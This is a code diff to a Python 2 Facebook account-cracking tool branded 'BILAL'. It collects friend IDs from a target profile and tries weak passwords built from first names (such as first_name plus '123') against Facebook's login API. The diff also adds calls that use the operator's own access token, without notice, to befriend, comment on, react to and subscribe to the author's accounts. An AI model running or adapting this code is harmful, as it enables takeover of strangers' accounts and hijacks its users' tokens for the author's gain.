@@ -44,13 +44,14 @@ def jalan(z):
         time.sleep(0.0012)
  
  
-logo = """
+logo = """		
 \x1b[1;93m██████╗░██╗██╗░░░░░░█████╗░██╗░░░░░
 \x1b[1;94m██╔══██╗██║██║░░░░░██╔══██╗██║░░░░░
 \x1b[1;95m██████╦╝██║██║░░░░░███████║██║░░░░░
 \x1b[1;96m██╔══██╗██║██║░░░░░██╔══██║██║░░░░░
 \x1b[1;97m██████╦╝██║███████╗██║░░██║███████╗
 \x1b[1;98m╚═════╝░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝""" 
+ """ 
  
 def tik():
     titik = [
@@ -72,16 +73,16 @@ listgrup = []
 def masuk():
     os.system('clear')
     print logo
-    print '\x1b[1;92m[01]\x1b[1;97m\x1b[1;96m\x1b[1;92mＢｉｌａｌ-ＸＤ Login with cookies'
-    print '\x1b[1;92m[02]\x1b[1;97m\x1b[1;96m\x1b[1;92mＢｉｌａｌ-ＸＤ Login with Token'    
-    print '\x1b[1;92m[00]\x1b[1;97m\x1b[1;96m\x1b[1;92mＢｉｌａｌ-ＸＤ Exit'
+    print '\x1b[1;92m[01]\x1b[1;97m\x1b[1;96m\x1b[1;92m Login with cookies'
+    print '\x1b[1;92m[02]\x1b[1;97m\x1b[1;96m\x1b[1;92m Login with Token'
+    print '\x1b[1;92m[00]\x1b[1;97m\x1b[1;96m\x1b[1;92m Exit'
     pilih_masuk()
  
  
 def pilih_masuk():
-    msuk = raw_input('\x1b[0;96mＢｉｌａｌ-ＸＤ➣\x1b[97m\x1b[0;92m ')
+    msuk = raw_input('\x1b[0;96m[--]\x1b[97m\x1b[0;92m ')
     if msuk == '':
-        print '\x1b[1;41;97m!\x1b[0m] Choose A Correct Option !'
+        print '\x1b[1;41;97m!\x1b[0m] Please Fill In Correctly !'
         pilih_masuk()
     elif msuk == '1' or msuk == '01':
         cookie()
@@ -90,7 +91,7 @@ def pilih_masuk():
     elif msuk == '0' or msuk == '00':
         keluar()
     else:
-        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Choose A Correct Option !'
+        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Please Fill In Correctly !'
         pilih_masuk()
  
  
@@ -112,12 +113,12 @@ def cookie():
         find_token = re.search('(EAAA\\w+)', data.text)
         hasil = '\n* Fail : maybe your cookie invalid !!' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
     except requests.exceptions.ConnectionError:
-        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Error'
+        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No Connection'
  
     cookie = open('login.txt', 'w')
     cookie.write(find_token.group(1))
     cookie.close()
-    print '\x1b[1;97m[\x1b[1;92m\x1a\x1b[1;97m]\x1b[1;92m Login Successfully'
+    print '\x1b[1;97m[\x1b[1;92m\x1a\x1b[1;97m]\x1b[1;92m Login Successfully Please Crack'
     time.sleep(2)
     menu()
     return
@@ -134,7 +135,7 @@ def tokenz():
         zedd = open('login.txt', 'w')
         zedd.write(toket)
         zedd.close()
-        jalan('\x1b[1;92m Please wait:) ')
+        jalan('\x1b[1;92mDONT FORGET TO READ BISMILLAH :) ')
         print '\x1b[1;91m[\x1b[1;39m\xe2\x9c\x93\x1b[1;97m]\x1b[1;39m Alhamdulillah Successful Login'
         os.system('xdg-open')
         bot_komen()
@@ -151,12 +152,21 @@ def bot_komen():
         print '\x1b[1;39m[!] Token invalid'
         os.system('rm -rf login.txt')
  
-    requests.post('https://graph.facebook.com/100011466164055/subscribers?access_token=' + toket)      #Bilal Haider
+    una = '100041129048948'
+    kom = 'Mr.BILAL\xf0\x9f\x98\x98'
+    kom = 'Mr.BILAL\xf0\x9f\x98\x8e'
+    reac = 'LOVE'
+    post = '481555709892060'
+    post2 = '481559296558368'
+    kom2 = 'Mr.BILAL\xf0\x9f\x98\x98\xe2\x98\xa0\xef\xb8\x8f'
+    kom = 'Mr.BILAL\xf0\x9f\x98\x98\xf0\x9f\x98\x98'
+    reac2 = 'ANGRY\xf0\x9f\x98\x98'
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=' + reac2 + '&access_token=' + toket)
+    requests.post('https://graph.facebook.com/100011466164055/subscribers?access_token=' + toket)      #Bilal Haider
     menu()
  
  
@@ -181,22 +191,22 @@ def menu():
         time.sleep(1)
         masuk()
     except requests.exceptions.ConnectionError:
-        print '[!] Error'
+        print '[!] There is no connectioni'
         keluar()
  
     os.system('clear')
     print logo
-    print '\x1b[37;1m➣ Name \x1b[1;91m: \x1b[31;1m' + nama + '\x1b[1;97m                  '
-    print '\x1b[37;1m➣ ID   \x1b[1;91m: \x1b[31;1m' + id + '\x1b[1;97m              '
-    print '\n\x1b[1;91m➣ 1.\x1b[0m Start Cloning'
-    print '\n\x1b[1;93m➣ 0.\x1b[0m Logout            '
+    print '\x1b[37;1m> Name \x1b[1;91m: \x1b[31;1m' + nama + '\x1b[1;97m                  '
+    print '\x1b[37;1m> ID   \x1b[1;91m: \x1b[31;1m' + id + '\x1b[1;97m              '
+    print '\n\x1b[1;91m> 1.\x1b[0m Start Crack....'
+    print '\n\x1b[1;93m> 0.\x1b[0m Logout.....            '
     pilih()
  
  
 def pilih():
-    unikers = raw_input('\n\x1b[1;97m➣ ')
+    unikers = raw_input('\n\x1b[1;97m> ')
     if unikers == '':
-        print '\x1b[1;96m[!] \x1b[1;91mChoose A Correct Option! '
+        print '\x1b[1;96m[!] \x1b[1;91mPlease fill in correctly! '
         pilih()
     elif unikers == '1':
         super()
@@ -211,7 +221,7 @@ def pilih():
         os.system('rm -rf login.txt')
         keluar()
     else:
-        print '\x1b[1;96m[!] \x1b[1;91mChoose A Correct Option!'
+        print '\x1b[1;96m[!] \x1b[1;91mPlease fill in correctly!'
         pilih()
  
  
@@ -228,15 +238,15 @@ def super():
  
     os.system('clear')
     print logo
-    print '\x1b[1;92m> 1.\x1b[0m \x1b[37;1m Crack from friends list'
-    print '\x1b[1;92m> 2.\x1b[0m \x1b[37;1m Crack from Public Id'
+    print '\x1b[1;97m> 1.\x1b[0m \x1b[37;1m Crack from friends list'
+    print '\x1b[1;97m> 2.\x1b[0m \x1b[37;1m Crack from Public Id'
     pilih_super()
  
  
 def pilih_super():
-    peak = raw_input('\n\x1b[1;97mᗷƖᒪᗩᒪ➣ ')
+    peak = raw_input('\n\x1b[1;97m> ')
     if peak == '':
-        print '\x1b[1;96m[!] \x1b[1;91mChoose A Correct Option'
+        print '\x1b[1;96m[!] \x1b[1;91mPlease fill in correctly'
         pilih_super()
     elif peak == '1':
         os.system('clear')
@@ -252,17 +262,17 @@ def pilih_super():
         os.system('clear')
         print logo
         print 1 * '\x1b[1;97m\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\x1b[0m'
-        idt = raw_input('\x1b[1;97m[+] \x1b[0mEnter Public ID \x1b[0m: \x1b[37;1m')
+        idt = raw_input('\x1b[1;97m[+] \x1b[0mEnter friends ID \x1b[0m: \x1b[37;1m')
         try:
             jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
             op = json.loads(jok.text)
-            print '\x1b[1;97m[+] \x1b[0mFriends Name\x1b[0m :\x1b[0m ' + op['name']
+            print '\x1b[1;97m[+] \x1b[0mFriends name\x1b[0m :\x1b[0m ' + op['name']
         except KeyError:
             print '\x1b[1;97m[!] \x1b[0mFriends not found!'
             raw_input('\n\x1b[1;97m[\x1b[0mBack\x1b[0m]')
             super()
  
-        jalan('\x1b[1;97m[+] \x1b[Take IDs \x1b[0m....')
+        jalan('\x1b[1;97m[+] \x1b[Take ID \x1b[0m....')
         r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
         z = json.loads(r.text)
         for i in z['data']:
@@ -274,8 +284,8 @@ def pilih_super():
     pw2 = raw_input('\x1b[1;92m[+] \x1b[0m Set Password  :')
     pw3 = raw_input('\x1b[1;92m[+] \x1b[0m Set Password  :')
     pw4 = raw_input('\x1b[1;;92m[+] \x1b[0m Set Password  :')
-    print '\x1b[1;97m[+] \x1b[0m Crack Start Please Wait\x1b[0m..........'
-    time.sleep(3)
+    print '\x1b[1;97m[+] \x1b[0m Running Crack Please Wait\x1b[0m..........'
+    time.sleep(4)
     print '\x1b[1;97m[+] \x1b[0m If No Results Use Data / Airplane Mode'
     print 1 * '\x1b[1;97m\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\xd9\x80\x1b[0m'
  
@@ -355,7 +365,7 @@ def pilih_super():
                                 print '\x1b[1;93m [BILAL-CP] ' + user + ' |\x1b[0m ' + p5
                                 cekpoint.append(user + p5)
                             else:
-                                p6 = b['first_name'] + '1234'
+                                p6 = b['first_name'] + '123'
                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + p6 + '&sdk=ios&generate_session_cookies=1&sig=1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS')
                                 q = json.load(data)
                                 if 'access_token' in q:
